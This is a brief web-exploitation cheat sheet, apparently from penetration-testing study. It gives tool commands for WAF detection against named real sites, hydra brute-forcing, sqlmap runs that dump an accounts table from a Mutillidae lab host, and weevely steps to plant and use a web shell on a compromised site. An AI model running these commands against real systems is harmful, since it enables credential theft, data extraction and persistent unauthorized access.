# Web Exploitation

WEB EXPLOITATION

  
 --Detect Firewall and Load Balancers--

* nmap -p 80 --script http-waf-detect.nse target.com
* wafw00f www.sears.com
* lbd www.twitter.com

  
 --Fingerprinting Web App and CMS--  
 nc -vv &lt;address&gt;&lt;port&gt;

* * -Web Crawlers / Proxies
* Burp Suite
* DirBuster
* OWASP\_ZAP
* Vega
* WebScarab
* WebSlayer

  
 --Website Mirroring--  
 httrack - downloads website to local system

 --Brute-Forcing Credentials--  
 hydra  
 hydra-gtk

 --Database Injection--  
 sqlmap - mutillidae login

 sqlmap -u 'http://192.168.1.14/mutillidae/index.php?page=user-info.php&username=admin&password=&user-info-php-submit-button=View+Account+Details' --dbs

 sqlmap -u 'http://192.168.75.129/mutillidae/index.php?page=user-info.php&username=admin&password=&user-info-php-submit-button=View+Account+Details' -D nowasp --tables

 sqlmap -u 'http://192.168.75.129/mutillidae/index.php?page=user-info.php&username=admin&password=&user-info-php-submit-button=View+Account+Details' -D nowasp -T accounts --dump

 --Maintaining Access with Web Shells--  
 weevely

* create weevely.php file - weevely generate &lt;password&gt;&lt;path&gt;
* upload to compromised website
* communicate with web shell - weevely http://&lt;target IP address&gt;&lt;directory&gt;&lt;password&gt;

